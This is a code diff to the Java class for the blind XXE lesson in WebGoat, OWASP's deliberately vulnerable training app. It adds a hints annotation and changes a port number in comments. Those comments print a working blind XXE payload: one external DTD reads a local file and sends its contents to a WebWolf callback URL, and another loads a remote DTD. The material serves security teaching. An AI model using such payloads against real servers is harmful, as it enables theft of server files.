@@ -4,6 +4,7 @@ import com.google.common.base.Charsets;
 import com.google.common.io.Files;
 import lombok.SneakyThrows;
 import org.owasp.webgoat.assignments.AssignmentEndpoint;
+import org.owasp.webgoat.assignments.AssignmentHints;
 import org.owasp.webgoat.assignments.AssignmentPath;
 import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.beans.factory.annotation.Autowired;
@@ -49,6 +50,7 @@ import static org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;
  * @since November 18, 2016
  */
 @AssignmentPath("xxe/blind")
+@AssignmentHints({"xxe.blind.hints.1","xxe.blind.hints.2","xxe.blind.hints.3","xxe.blind.hints.4","xxe.blind.hints.5"})
 public class BlindSendFileAssignment extends AssignmentEndpoint {
 
     static final String CONTENTS = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";
@@ -87,7 +89,7 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
 /**
 <?xml version="1.0"?>
 <!DOCTYPE comment [
-<!ENTITY % remote SYSTEM "http://localhost:8081/files/admin2/attack.dtd">
+<!ENTITY % remote SYSTEM "http://localhost:9090/files/admin2/attack.dtd">
 %remote;
 ]>
 <comment>  <text>test&send;</text></comment>
@@ -100,14 +102,14 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
      * <pre>
      *     <?xml version="1.0" encoding="UTF-8"?>
      *     <!ENTITY % file SYSTEM "file:///c:/windows-version.txt">
-     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:8081/ping?text=%file;'>">
+     *     <!ENTITY % all "<!ENTITY send SYSTEM 'http://localhost:9090/ping?text=%file;'>">
      *      %all;
      * </pre>
      *
      * This will be reduced to:
      *
      * <pre>
-     *     <!ENTITY send SYSTEM 'http://localhost:8081/ping?text=[contents_file]'>
+     *     <!ENTITY send SYSTEM 'http://localhost:9090/ping?text=[contents_file]'>
      * </pre>
      *
      * Wire it all up in the xml send to the server:
@@ -115,7 +117,7 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
      * <pre>
      *  <?xml version="1.0"?>
      *  <!DOCTYPE root [
-     *  <!ENTITY % remote SYSTEM "http://localhost:8081/WebWolf/files/test.dtd">
+     *  <!ENTITY % remote SYSTEM "http://localhost:9090/WebWolf/files/test.dtd">
      *  %remote;
      *   ]>
      *  <user>
